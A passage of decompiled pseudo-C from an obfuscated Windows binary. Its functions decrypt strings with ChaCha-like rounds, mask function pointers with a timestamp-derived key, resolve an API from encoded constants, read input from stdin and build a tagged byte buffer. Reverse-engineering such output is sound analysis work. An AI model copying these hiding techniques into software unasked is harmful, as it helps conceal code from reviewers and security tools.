          uVar21 = uVar21 ^ uVar15;
          uVar21 = uVar21 << 0x10 | uVar21 >> 0x10;
          uVar20 = uVar20 + uVar21;
          uVar16 = uVar16 ^ uVar20;
          uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
          uVar15 = uVar16 + uVar15;
          uVar21 = uVar21 ^ uVar15;
          uVar21 = uVar21 << 8 | uVar21 >> 0x18;
          uVar20 = uVar20 + uVar21;
          uVar16 = uVar16 ^ uVar20;
          bVar2 = *(byte *)((ulonglong)uVar19 + lVar12);
          *(undefined1 *)((ulonglong)uVar19 + lVar12) = 0;
          if (uVar19 < uVar23) {
            bVar14 = *(byte *)((ulonglong)((uint)uVar19 + (uint)uVar26) +
                              *(longlong *)(param_1 + 0x260));
          }
          else {
            bVar14 = 0;
          }
          uVar19 = uVar19 + 1;
          bVar25 = bVar25 | bVar14 ^ (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar21 ^ uVar20 ^
                                            uVar15) >> (sbyte)((uVar24 & 3) << 3)) ^ bVar2;
        } while (uVar19 < uVar18);
      }
      FUN_1400022c0(uVar4 + *(longlong *)(param_1 + 0x260),uVar5 + 1);
      FUN_1400022c0(lVar12,uVar5);
      FUN_140001bf0(lVar12);
      puVar13 = (ulonglong *)(param_1 + (uVar3 & 0xff) * 8);
      if (7 < (byte)uVar3) {
        puVar13 = &DAT_140010260;
      }
      *puVar13 = (ulonglong)(bVar25 != 0);
      return;
    }
  }
  *(undefined1 *)(param_1 + 0x48) = 0;
  return;
}


// ==== FUN_140006110 @ 140006110 size 196

void FUN_140006110(longlong param_1,undefined4 param_2)

{
  longlong *plVar1;
  undefined1 *puVar2;
  undefined1 local_18 [16];
  
  plVar1 = (longlong *)(param_1 + 0x200);
  puVar2 = *(undefined1 **)(param_1 + 0x208);
  local_18[0] = (undefined1)param_2;
  if (puVar2 == *(undefined1 **)(param_1 + 0x210)) {
    FUN_14000b6c0(plVar1,puVar2,local_18);
  }
  else {
    *puVar2 = local_18[0];
    *(longlong *)(param_1 + 0x208) = *(longlong *)(param_1 + 0x208) + 1;
  }
  puVar2 = *(undefined1 **)(param_1 + 0x208);
  local_18[0] = (undefined1)((uint)param_2 >> 8);
  if (puVar2 == *(undefined1 **)(param_1 + 0x210)) {
    FUN_14000b6c0(plVar1,puVar2,local_18);
  }
  else {
    *puVar2 = local_18[0];
    *(longlong *)(param_1 + 0x208) = *(longlong *)(param_1 + 0x208) + 1;
  }
  puVar2 = *(undefined1 **)(param_1 + 0x208);
  local_18[0] = (undefined1)((uint)param_2 >> 0x10);
  if (puVar2 == *(undefined1 **)(param_1 + 0x210)) {
    FUN_14000b6c0(plVar1,puVar2,local_18);
  }
  else {
    *puVar2 = local_18[0];
    *(longlong *)(param_1 + 0x208) = *(longlong *)(param_1 + 0x208) + 1;
  }
  puVar2 = *(undefined1 **)(param_1 + 0x208);
  local_18[0] = (undefined1)((uint)param_2 >> 0x18);
  if (puVar2 == *(undefined1 **)(param_1 + 0x210)) {
    FUN_14000b6c0(plVar1,puVar2,local_18);
    return;
  }
  *puVar2 = local_18[0];
  *(longlong *)(param_1 + 0x208) = *(longlong *)(param_1 + 0x208) + 1;
  return;
}


// ==== FUN_1400061e0 @ 1400061e0 size 603

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

void FUN_1400061e0(undefined8 *param_1,longlong param_2)

{
  byte *pbVar1;
  undefined8 uVar2;
  ulonglong uVar3;
  uint *puVar4;
  undefined8 *puVar5;
  longlong lVar6;
  uint uVar7;
  uint uVar8;
  char cVar9;
  uint uVar10;
  undefined1 auStack_58 [32];
  undefined8 local_38;
  undefined8 local_30;
  ulonglong local_28;
  
  uVar2 = DAT_1400101f8;
  local_28 = DAT_140010000 ^ (ulonglong)auStack_58;
  local_30 = 0;
  puVar4 = FUN_1400015f0();
  uVar8 = puVar4[8];
  uVar7 = (uint)((ulonglong)uVar2 >> 0x20);
  uVar10 = (uint)uVar2;
  local_30 = 0;
  uVar8 = (((((((((uint)&local_30 & 0xff ^ uVar7 ^ uVar10 ^ 0x9ea6ed67) * uVar8 ^
                (uint)(byte)((ulonglong)&local_30 >> 8)) * uVar8 ^
               (uint)(byte)((ulonglong)&local_30 >> 0x10)) * uVar8 ^
              (uint)(byte)((ulonglong)&local_30 >> 0x18)) * uVar8 ^
             (uint)(byte)((ulonglong)&local_30 >> 0x20)) * uVar8 ^
            (uint)(byte)((ulonglong)&local_30 >> 0x28)) * uVar8 ^
           (uint)(byte)((ulonglong)&local_30 >> 0x30)) * uVar8 ^
          (uint)(byte)((ulonglong)&local_30 >> 0x38)) * uVar8;
  FUN_140003c30(param_2,param_1 + 0x40);
  lVar6 = 4;
  puVar5 = (undefined8 *)(param_2 + 0x2a0);
  do {
    uVar2 = param_1[1];
    *puVar5 = *param_1;
    puVar5[1] = uVar2;
    uVar2 = param_1[3];
    puVar5[2] = param_1[2];
    puVar5[3] = uVar2;
    uVar2 = param_1[5];
    puVar5[4] = param_1[4];
    puVar5[5] = uVar2;
    uVar2 = param_1[7];
    puVar5[6] = param_1[6];
    puVar5[7] = uVar2;
    uVar2 = param_1[9];
    puVar5[8] = param_1[8];
    puVar5[9] = uVar2;
    uVar2 = param_1[0xb];
    puVar5[10] = param_1[10];
    puVar5[0xb] = uVar2;
    uVar2 = param_1[0xd];
    puVar5[0xc] = param_1[0xc];
    puVar5[0xd] = uVar2;
    uVar2 = param_1[0xf];
    puVar5[0xe] = param_1[0xe];
    puVar5[0xf] = uVar2;
    lVar6 = lVar6 + -1;
    puVar5 = puVar5 + 0x10;
    param_1 = param_1 + 0x10;
  } while (lVar6 != 0);
  *(uint *)(param_2 + 0x290) =
       (uint)((ulonglong)ProcessEnvironmentBlock >> 0x10) ^ uVar7 ^ uVar10 ^
       (uint)ProcessEnvironmentBlock ^ uVar8 ^ 0x9ea6ed67;
  if (((*(longlong *)(param_2 + 0x268) != 0) && (*(longlong *)(param_2 + 0x270) != 0)) &&
     (local_38 = 0, *(longlong *)(param_2 + 0x270) != 0)) {
    do {
      uVar3 = local_38;
      puVar4 = FUN_1400015f0();
      cVar9 = (char)puVar4[8];
      pbVar1 = (byte *)(*(longlong *)(param_2 + 0x268) + uVar3);
      *pbVar1 = *pbVar1 ^ (((((((((byte)uVar8 ^ (byte)uVar3) * cVar9 ^ local_38._1_1_) * cVar9 ^
                               local_38._2_1_) * cVar9 ^ local_38._3_1_) * cVar9 ^ local_38._4_1_) *
                             cVar9 ^ local_38._5_1_) * cVar9 ^ local_38._6_1_) * cVar9 ^
                          local_38._7_1_) * cVar9;
      local_38 = uVar3 + 1;
    } while (local_38 < *(ulonglong *)(param_2 + 0x270));
  }
  return;
}


// ==== FUN_140006440 @ 140006440 size 583

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

longlong * FUN_140006440(longlong *param_1)

{
  int iVar1;
  ulonglong uVar2;
  code *pcVar3;
  longlong lVar4;
  longlong lVar5;
  ulonglong uVar6;
  undefined1 auStack_b8 [32];
  undefined8 local_98;
  undefined4 local_88;
  undefined4 local_84;
  undefined4 local_80;
  undefined1 local_7c;
  undefined2 local_7b;
  undefined1 local_79;
  undefined4 local_78;
  undefined4 local_70;
  undefined4 local_6c;
  undefined4 local_68;
  undefined1 local_64;
  undefined2 local_63;
  undefined1 local_61;
  undefined4 local_60;
  undefined4 local_58;
  undefined4 local_54;
  undefined1 local_50;
  undefined2 local_4f;
  undefined1 local_4d;
  undefined4 local_4c;
  undefined4 local_48;
  longlong *local_40;
  undefined1 local_38 [4];
  int local_34;
  ulonglong local_30;
  ulonglong local_28;
  
  local_28 = DAT_140010000 ^ (ulonglong)auStack_b8;
  local_48 = 1;
  local_88 = 0x39cdc8fd;
  local_84 = 0x446fc2a;
  local_80 = 0xf618d993;
  local_7c = 0xc2;
  local_7b = 0;
  local_79 = 0;
  local_78 = 0x3a;
  local_58 = 0x6cd5e7da;
  local_54 = 0x5c59d279;
  local_50 = 0x3f;
  local_4f = 0;
  local_4d = 0;
  local_4c = 0x3b;
  local_70 = 0x9b6d3c0;
  local_6c = 0xac114aa;
  local_68 = 0x9f26ba04;
  local_64 = 0xfe;
  local_63 = 0;
  local_61 = 0;
  local_60 = 0x3c;
  local_40 = param_1;
  if (DAT_140010288 == '\0') {
    DAT_140010288 = '\x01';
    local_30 = rdtsc();
    DAT_1400101d0 = local_30 ^ 0x190747845;
    uVar2 = FUN_14000ab00((longlong)&local_88,(longlong)&local_58);
    pcVar3 = (code *)FUN_140006f00((longlong)&local_88,(longlong)&local_70);
    DAT_1400101b8 = uVar2 ^ DAT_1400101d0;
    if (pcVar3 != (code *)0x0) {
      uVar2 = (*pcVar3)(0xfffffff6);
      DAT_140010080 = uVar2 ^ DAT_1400101d0;
    }
  }
  uVar2 = DAT_1400101d0;
  pcVar3 = (code *)(DAT_1400101b8 ^ DAT_1400101d0);
  uVar6 = DAT_140010080 ^ DAT_1400101d0;
  *param_1 = 0;
  *(undefined4 *)(param_1 + 1) = 0;
  lVar4 = FUN_140001a00(uVar2,0xffff);
  *param_1 = lVar4;
  if (lVar4 != 0) {
    FUN_1400022c0(lVar4,0xffff);
  }
  local_48 = 1;
  lVar4 = *param_1;
  if (((lVar4 != 0) && (pcVar3 != (code *)0x0)) && (uVar6 != 0xffffffffffffffff)) {
    iVar1 = (int)param_1[1];
    while (iVar1 < 0xfffe) {
      local_34 = 0;
      local_98 = 0;
      iVar1 = (*pcVar3)(uVar6,iVar1 + lVar4,1,&local_34);
      if ((iVar1 == 0) || (local_34 == 0)) break;
      lVar5 = (longlong)(int)param_1[1];
      lVar4 = *param_1;
      if (*(char *)(lVar5 + lVar4) == '\n') {
        *(undefined1 *)(lVar5 + lVar4) = 0;
        break;
      }
      if (*(char *)(lVar5 + lVar4) == '\r') {
        *(undefined1 *)(lVar5 + lVar4) = 0;
        local_38[0] = 0;
        local_30 = local_30 & 0xffffffff00000000;
        local_98 = 0;
        (*pcVar3)(uVar6,local_38,1,&local_30);
        break;
      }
      iVar1 = (int)param_1[1] + 1;
      *(int *)(param_1 + 1) = iVar1;
    }
    *(undefined1 *)((longlong)(int)param_1[1] + *param_1) = 0;
  }
  return param_1;
}


// ==== FUN_140006690 @ 140006690 size 107

void FUN_140006690(longlong param_1)

{
  code *pcVar1;
  void *pvVar2;
  void *_Memory;
  undefined1 *puVar3;
  undefined1 *puVar4;
  undefined1 auStack_28 [8];
  undefined1 auStack_20 [24];
  
  puVar3 = auStack_28;
  puVar4 = auStack_28;
  pvVar2 = *(void **)(param_1 + 0x200);
  if (pvVar2 == (void *)0x0) {
    return;
  }
  if (0xfff < (ulonglong)(*(longlong *)(param_1 + 0x210) - (longlong)pvVar2)) {
    _Memory = *(void **)((longlong)pvVar2 + -8);
    if ((ulonglong)((longlong)pvVar2 + (-8 - (longlong)_Memory)) < 0x20) goto LAB_1400066d9;
    pcVar1 = (code *)swi(0x29);
    pvVar2 = (void *)(*pcVar1)(5);
    puVar3 = auStack_20;
  }
  _Memory = pvVar2;
  puVar4 = puVar3;
LAB_1400066d9:
  *(undefined8 *)(puVar4 + -8) = 0x1400066de;
  free(_Memory);
  *(undefined8 *)(param_1 + 0x200) = 0;
  *(undefined8 *)(param_1 + 0x208) = 0;
  *(undefined8 *)(param_1 + 0x210) = 0;
  return;
}


// ==== FUN_140006700 @ 140006700 size 235

void * FUN_140006700(void *param_1)

{
  FUN_1400022c0((longlong)param_1,0x40);
  FUN_1400022c0((longlong)param_1 + 0x58,0x200);
  if (*(longlong *)((longlong)param_1 + 0x260) != 0) {
    FUN_1400022c0(*(longlong *)((longlong)param_1 + 0x260),0x10000);
    FUN_140001bf0(*(undefined8 *)((longlong)param_1 + 0x260));
    *(undefined8 *)((longlong)param_1 + 0x260) = 0;
  }
  if (*(longlong *)((longlong)param_1 + 0x4a0) != 0) {
    FUN_1400022c0(*(longlong *)((longlong)param_1 + 0x4a0),0x10000);
    FUN_140001bf0(*(undefined8 *)((longlong)param_1 + 0x4a0));
    *(undefined8 *)((longlong)param_1 + 0x4a0) = 0;
  }
  *(undefined2 *)((longlong)param_1 + 0x4a8) = 0;
  FUN_1400022c0((longlong)param_1 + 0x4ac,0x10);
  *(undefined4 *)((longlong)param_1 + 0x4bc) = 0;
  FUN_140003910((longlong)param_1);
  *(undefined8 *)((longlong)param_1 + 0x40) = 0;
  *(undefined1 *)((longlong)param_1 + 0x48) = 0;
  *(undefined8 *)((longlong)param_1 + 0x280) = 0;
  *(undefined8 *)((longlong)param_1 + 0x288) = 0;
  *(undefined4 *)((longlong)param_1 + 0x290) = 0;
  *(undefined8 *)((longlong)param_1 + 0x298) = 0;
  *(undefined8 *)((longlong)param_1 + 0x4c0) = 0;
  *(undefined8 *)((longlong)param_1 + 0x4c8) = 0;
  free(param_1);
  return param_1;
}


// ==== FUN_1400067f0 @ 1400067f0 size 183

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

undefined8 FUN_1400067f0(undefined8 param_1)

{
  code *pcVar1;
  undefined1 auStack_78 [32];
  undefined8 *local_58;
  longlong local_48;
  undefined2 local_40 [4];
  undefined8 local_38;
  undefined8 uStack_30;
  longlong *local_28;
  undefined2 *local_20;
  undefined8 *local_18;
  ulonglong local_10;
  
  local_10 = DAT_140010000 ^ (ulonglong)auStack_78;
  local_48 = FUN_140001a00(param_1,0xffff);
  local_40[0] = 0;
  local_38 = 0;
  uStack_30 = 0;
  if (local_48 != 0) {
    local_28 = &local_48;
    local_20 = local_40;
    local_18 = &local_38;
    pcVar1 = (code *)FUN_14000d730();
    local_58 = &local_38;
    (*pcVar1)(&LAB_140006ef0,&local_28,local_48,local_40);
    FUN_1400022c0(local_48,0xffff);
    FUN_1400022c0((longlong)&local_38,0x10);
    FUN_140001bf0(local_48);
  }
  return 0;
}


// ==== FUN_1400068b0 @ 1400068b0 size 1589

void FUN_1400068b0(undefined8 *param_1,undefined8 *param_2,longlong *param_3)

{
  longlong *plVar1;
  undefined1 *puVar2;
  undefined1 *puVar3;
  longlong lVar4;
  undefined1 *puVar5;
  longlong lVar6;
  longlong lVar7;
  ulonglong uVar8;
  undefined1 local_c8 [16];
  undefined2 local_b8;
  undefined1 local_b6;
  undefined4 local_a8;
  undefined4 local_a4;
  undefined4 local_a0;
  undefined4 local_9c;
  undefined4 local_98;
  undefined4 local_94;
  undefined4 local_90;
  undefined4 local_8c;
  undefined4 local_88;
  undefined4 local_84;
  undefined4 local_80;
  undefined4 local_7c;
  undefined4 local_78;
  undefined4 local_74;
  undefined4 local_70;
  undefined4 local_6c;
  undefined4 local_68;
  undefined4 local_64;
  undefined4 local_60;
  undefined4 local_5c;
  undefined4 local_58;
  undefined4 local_54;
  undefined4 local_50;
  undefined4 local_4c;
  undefined4 local_48;
  undefined1 local_44;
  undefined2 local_43;
  undefined1 local_41;
  undefined4 local_40;
  longlong local_38 [2];
  
  local_a8 = 0x53c80d86;
  local_a4 = 0xe2ffbe31;
  local_a0 = 0x114502;
  local_9c = 0x3d;
  plVar1 = param_2 + 0x40;
  puVar2 = (undefined1 *)param_2[0x41];
  if (puVar2 == (undefined1 *)param_2[0x42]) {
    FUN_14000b6c0(plVar1,puVar2,(undefined1 *)((longlong)param_2 + 0x17));
  }
  else {
    *puVar2 = *(undefined1 *)((longlong)param_2 + 0x17);
    param_2[0x41] = param_2[0x41] + 1;
  }
  FUN_140006110((longlong)param_2,0x3d);
  local_c8[0] = 0xb;
  puVar2 = (undefined1 *)param_2[0x41];
  if (puVar2 == (undefined1 *)param_2[0x42]) {
    FUN_14000b6c0(plVar1,puVar2,local_c8);
  }
  else {
    *puVar2 = 0xb;
    param_2[0x41] = param_2[0x41] + 1;
  }
  local_c8[0] = 0;
  puVar2 = (undefined1 *)param_2[0x41];
  if (puVar2 == (undefined1 *)param_2[0x42]) {
    FUN_14000b6c0(plVar1,puVar2,local_c8);
  }
  else {
    *puVar2 = 0;
    param_2[0x41] = param_2[0x41] + 1;
  }
  local_c8[0] = 0;
  puVar2 = (undefined1 *)param_2[0x41];
  if (puVar2 == (undefined1 *)param_2[0x42]) {
    FUN_14000b6c0(plVar1,puVar2,local_c8);
  }
  else {
    *puVar2 = 0;
    param_2[0x41] = param_2[0x41] + 1;
  }
  local_c8[0] = 0;
  puVar2 = (undefined1 *)param_2[0x41];
  if (puVar2 == (undefined1 *)param_2[0x42]) {
    FUN_14000b6c0(plVar1,puVar2,local_c8);
  }
  else {
    *puVar2 = 0;
    param_2[0x41] = param_2[0x41] + 1;
  }
  local_c8[0] = 0;
  puVar2 = (undefined1 *)param_2[0x41];
  if (puVar2 == (undefined1 *)param_2[0x42]) {
    FUN_14000b6c0(plVar1,puVar2,local_c8);
  }
  else {
    *puVar2 = 0;
    param_2[0x41] = param_2[0x41] + 1;
  }
  uVar8 = 0;
  do {
    local_c8[0] = *(undefined1 *)((longlong)local_38 + (uVar8 - 0x70));
    puVar2 = (undefined1 *)param_2[0x41];
    if (puVar2 == (undefined1 *)param_2[0x42]) {
      FUN_14000b6c0(plVar1,puVar2,local_c8);
    }
    else {
      *puVar2 = local_c8[0];
      param_2[0x41] = param_2[0x41] + 1;
    }
    uVar8 = uVar8 + 1;
  } while (uVar8 < 0xb);
  FUN_14000d000(local_38,param_2,param_3,*(void **)*param_1,(undefined2 *)param_1[1],
                (uint *)param_1[2]);
  puVar2 = (undefined1 *)param_2[0x41];
  if (puVar2 == (undefined1 *)param_2[0x42]) {
    FUN_14000b6c0(plVar1,puVar2,(undefined1 *)param_2);
  }
  else {
    *puVar2 = *(undefined1 *)param_2;
    param_2[0x41] = param_2[0x41] + 1;
  }
  local_c8[0] = 3;
  puVar2 = (undefined1 *)param_2[0x41];
  if (puVar2 == (undefined1 *)param_2[0x42]) {
    FUN_14000b6c0(plVar1,puVar2,local_c8);
  }
  else {
    *puVar2 = 3;
    param_2[0x41] = param_2[0x41] + 1;
  }
  FUN_140006110((longlong)param_2,0);
  puVar2 = (undefined1 *)param_2[0x41];
  if (puVar2 == (undefined1 *)param_2[0x42]) {
    FUN_14000b6c0(plVar1,puVar2,(undefined1 *)param_2);
  }
  else {
    *puVar2 = *(undefined1 *)param_2;
    param_2[0x41] = param_2[0x41] + 1;
  }
  local_c8[0] = 6;
  puVar2 = (undefined1 *)param_2[0x41];
  if (puVar2 == (undefined1 *)param_2[0x42]) {
    FUN_14000b6c0(plVar1,puVar2,local_c8);
  }
  else {
    *puVar2 = 6;
    param_2[0x41] = param_2[0x41] + 1;
  }
  FUN_140006110((longlong)param_2,0);
  puVar2 = (undefined1 *)param_2[0x41];
  if (puVar2 == (undefined1 *)param_2[0x42]) {
    FUN_14000b6c0(plVar1,puVar2,(undefined1 *)((longlong)param_2 + 0x1c));
  }
  else {
    *puVar2 = *(undefined1 *)((longlong)param_2 + 0x1c);
    param_2[0x41] = param_2[0x41] + 1;
  }
  puVar2 = (undefined1 *)param_2[0x41];
  if (puVar2 == (undefined1 *)param_2[0x42]) {
    FUN_14000b6c0(plVar1,puVar2,(undefined1 *)((longlong)param_2 + 0x1f));
  }
  else {
    *puVar2 = *(undefined1 *)((longlong)param_2 + 0x1f);
    param_2[0x41] = param_2[0x41] + 1;
  }
  local_98 = 0x88199109;
  local_94 = 0x89bc333f;
  local_90 = 0xb75d33fa;
  local_8c = 0xa1e8019d;
  local_88 = 0x23e86fda;
  local_84 = 0xa7b9c56b;
  local_80 = 0x90fea06f;
  local_7c = 0x69ceaacd;
  local_78 = 0x5ee8bbb7;
  local_74 = 0x823a8082;
  local_70 = 0x6f91a639;
  local_6c = 0xe137a21;
  local_68 = 0x8b02c9d1;
  local_64 = 0xaa9f6dcb;
  local_60 = 0x4dd4a758;
  local_5c = 0xf8f5d3ef;
  local_58 = 0xcd4ea20f;
  local_54 = 0x93c772e0;
  local_50 = 0xed8c54bf;
  local_4c = 0x5b6b8c96;
  local_48 = 0x9173bb49;
  local_44 = 0x7e;
  local_43 = 0;
  local_41 = 0;
  local_40 = 0xd8e0bc14;
  puVar2 = (undefined1 *)param_2[0x41];
  if (puVar2 == (undefined1 *)param_2[0x42]) {
    FUN_14000b6c0(plVar1,puVar2,(undefined1 *)((longlong)param_2 + 0x1e));
  }
  else {
    *puVar2 = *(undefined1 *)((longlong)param_2 + 0x1e);
    param_2[0x41] = param_2[0x41] + 1;
  }
  local_c8[0] = 3;
  puVar2 = (undefined1 *)param_2[0x41];
  if (puVar2 == (undefined1 *)param_2[0x42]) {
    FUN_14000b6c0(plVar1,puVar2,local_c8);
  }
  else {
    *puVar2 = 3;
    param_2[0x41] = param_2[0x41] + 1;
  }
  local_c8[0] = 0;
  puVar2 = (undefined1 *)param_2[0x41];
  if (puVar2 == (undefined1 *)param_2[0x42]) {
    FUN_14000b6c0(plVar1,puVar2,local_c8);
  }
  else {
    *puVar2 = 0;
    param_2[0x41] = param_2[0x41] + 1;
  }
  local_c8[0] = 0;
  puVar2 = (undefined1 *)param_2[0x41];
  if (puVar2 == (undefined1 *)param_2[0x42]) {
    FUN_14000b6c0(plVar1,puVar2,local_c8);
  }
  else {
    *puVar2 = 0;
    param_2[0x41] = param_2[0x41] + 1;
  }
  FUN_140006110((longlong)param_2,0xd8e0bc14);
  local_c8[0] = 0x54;
  puVar2 = (undefined1 *)param_2[0x41];
  if (puVar2 == (undefined1 *)param_2[0x42]) {
    FUN_14000b6c0(plVar1,puVar2,local_c8);
  }
  else {
    *puVar2 = 0x54;
    param_2[0x41] = param_2[0x41] + 1;
  }
  local_c8[0] = 0;
  puVar2 = (undefined1 *)param_2[0x41];
  if (puVar2 == (undefined1 *)param_2[0x42]) {
    FUN_14000b6c0(plVar1,puVar2,local_c8);
  }
  else {
    *puVar2 = 0;
    param_2[0x41] = param_2[0x41] + 1;
  }
  uVar8 = 0;
  do {
    local_c8[0] = *(undefined1 *)((longlong)local_38 + (uVar8 - 0x60));
    puVar2 = (undefined1 *)param_2[0x41];
    if (puVar2 == (undefined1 *)param_2[0x42]) {
      FUN_14000b6c0(plVar1,puVar2,local_c8);
    }
    else {
      *puVar2 = local_c8[0];
      param_2[0x41] = param_2[0x41] + 1;
    }
    uVar8 = uVar8 + 1;
  } while (uVar8 < 0x54);
  puVar2 = (undefined1 *)param_2[0x41];
  if (puVar2 == (undefined1 *)param_2[0x42]) {
    FUN_14000b6c0(plVar1,puVar2,(undefined1 *)((longlong)param_2 + 0xd));
  }
  else {
    *puVar2 = *(undefined1 *)((longlong)param_2 + 0xd);
    param_2[0x41] = param_2[0x41] + 1;
  }
  local_c8[0] = 3;
  puVar2 = (undefined1 *)param_2[0x41];
  if (puVar2 == (undefined1 *)param_2[0x42]) {
    FUN_14000b6c0(plVar1,puVar2,local_c8);
  }
  else {
    *puVar2 = 3;
    param_2[0x41] = param_2[0x41] + 1;
  }
  local_c8[0] = 6;
  puVar2 = (undefined1 *)param_2[0x41];
  if (puVar2 == (undefined1 *)param_2[0x42]) {
    FUN_14000b6c0(plVar1,puVar2,local_c8);
  }
  else {
    *puVar2 = 6;
    param_2[0x41] = param_2[0x41] + 1;
  }
  puVar2 = (undefined1 *)param_2[0x41];
  if (puVar2 == (undefined1 *)param_2[0x42]) {
    FUN_14000b6c0(plVar1,puVar2,(undefined1 *)(param_2 + 2));
  }
  else {
    *puVar2 = *(undefined1 *)(param_2 + 2);
    param_2[0x41] = param_2[0x41] + 1;
  }
  puVar2 = (undefined1 *)param_2[0x41];
  lVar7 = *plVar1;
  local_c8[0] = 0;
  if (puVar2 == (undefined1 *)param_2[0x42]) {
    FUN_14000b6c0(plVar1,puVar2,local_c8);
  }
  else {
    *puVar2 = 0;
    param_2[0x41] = param_2[0x41] + 1;
  }
  local_c8[0] = 0;
  puVar3 = (undefined1 *)param_2[0x41];
  if (puVar3 == (undefined1 *)param_2[0x42]) {
    FUN_14000b6c0(plVar1,puVar3,local_c8);
  }
  else {
    *puVar3 = 0;
    param_2[0x41] = param_2[0x41] + 1;
  }
  local_a8 = 0xb025fe11;
  local_a4 = 0xb4c445d3;
  local_a0 = 0x3f;
  local_b8 = 0;
  local_b6 = 0;
  FUN_14000b280((longlong)param_2,(undefined1 *)&local_a8,(undefined1 *)&local_b8);
  puVar3 = (undefined1 *)param_2[0x41];
  if (puVar3 == (undefined1 *)param_2[0x42]) {
    FUN_14000b6c0(plVar1,puVar3,(undefined1 *)((longlong)param_2 + 0xe));
  }
  else {
    *puVar3 = *(undefined1 *)((longlong)param_2 + 0xe);
    param_2[0x41] = param_2[0x41] + 1;
  }
  puVar3 = (undefined1 *)param_2[0x41];
  lVar4 = *plVar1;
  local_c8[0] = 0;
  if (puVar3 == (undefined1 *)param_2[0x42]) {
    FUN_14000b6c0(plVar1,puVar3,local_c8);
  }
  else {
    *puVar3 = 0;
    param_2[0x41] = param_2[0x41] + 1;
  }
  local_c8[0] = 0;
  puVar5 = (undefined1 *)param_2[0x41];
  if (puVar5 == (undefined1 *)param_2[0x42]) {
    FUN_14000b6c0(plVar1,puVar5,local_c8);
  }
  else {
    *puVar5 = 0;
    param_2[0x41] = param_2[0x41] + 1;
  }
  lVar6 = param_2[0x41] - *plVar1;
  puVar2[*plVar1 - lVar7] = (char)lVar6;
  puVar2[*plVar1 + (1 - lVar7)] = (char)((ulonglong)lVar6 >> 8);
  local_a8 = 0x16a61;
  local_a4 = 0x2a00;
  local_a0 = 0x40;
  local_b8 = 0;
  local_b6 = 0;
  FUN_14000b4c0((longlong)param_2,(undefined1 *)&local_a8,(undefined1 *)&local_b8);
  lVar7 = param_2[0x41] - *plVar1;
  puVar3[*plVar1 - lVar4] = (char)lVar7;
  puVar3[*plVar1 + (1 - lVar4)] = (char)((ulonglong)lVar7 >> 8);
  if (local_38[0] != 0) {
    FUN_1400022c0(local_38[0],0xffff);
    FUN_140001bf0(local_38[0]);
  }
  return;
}


// ==== FUN_140006f00 @ 140006f00 size 955

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

longlong FUN_140006f00(longlong param_1,longlong param_2)

{
  byte *pbVar1;
  byte bVar2;
  short *psVar3;
  byte *pbVar4;
  longlong lVar5;
  uint uVar6;
  uint uVar7;
  byte *pbVar8;
  uint uVar9;
  longlong lVar10;
  ulonglong uVar11;
  uint uVar12;
  uint uVar13;
  ulonglong uVar14;
  uint uVar15;
  uint uVar16;
  undefined1 auStack_118 [32];
  byte local_f8 [192];
  ulonglong local_38;
  
  local_38 = DAT_140010000 ^ (ulonglong)auStack_118;
  uVar13 = *(uint *)(param_1 + 0x10);
  uVar11 = 0;
  local_f8[0] = 0;
  local_f8[1] = 0;
  local_f8[2] = 0;
  local_f8[3] = 0;
  local_f8[4] = 0;
  local_f8[5] = 0;
  local_f8[6] = 0;
  local_f8[7] = 0;
  local_f8[8] = 0;
  local_f8[9] = 0;
  local_f8[10] = 0;
  local_f8[0xb] = 0;
  local_f8[0xc] = 0;
  local_f8[0xd] = 0;
  local_f8[0xe] = 0;
  local_f8[0xf] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x10] = 0;
  local_f8[0x11] = 0;
  local_f8[0x12] = 0;
  local_f8[0x13] = 0;
  local_f8[0x14] = 0;
  local_f8[0x15] = 0;
  local_f8[0x16] = 0;
  local_f8[0x17] = 0;
  local_f8[0x18] = 0;
  local_f8[0x19] = 0;
  local_f8[0x1a] = 0;
  local_f8[0x1b] = 0;
  local_f8[0x1c] = 0;
  local_f8[0x1d] = 0;
  local_f8[0x1e] = 0;
  local_f8[0x1f] = 0;
  local_f8[0x20] = 0;
  local_f8[0x21] = 0;
  local_f8[0x22] = 0;
  local_f8[0x23] = 0;
  local_f8[0x24] = 0;
  local_f8[0x25] = 0;
  local_f8[0x26] = 0;
  local_f8[0x27] = 0;
  local_f8[0x28] = 0;
  local_f8[0x29] = 0;
  local_f8[0x2a] = 0;
  local_f8[0x2b] = 0;
  local_f8[0x2c] = 0;
  local_f8[0x2d] = 0;
  local_f8[0x2e] = 0;
  local_f8[0x2f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x30] = 0;
  local_f8[0x31] = 0;
  local_f8[0x32] = 0;
  local_f8[0x33] = 0;
  local_f8[0x34] = 0;
  local_f8[0x35] = 0;
  local_f8[0x36] = 0;
  local_f8[0x37] = 0;
  local_f8[0x38] = 0;
  local_f8[0x39] = 0;
  local_f8[0x3a] = 0;
  local_f8[0x3b] = 0;
  local_f8[0x3c] = 0;
  local_f8[0x3d] = 0;
  local_f8[0x3e] = 0;
  local_f8[0x3f] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
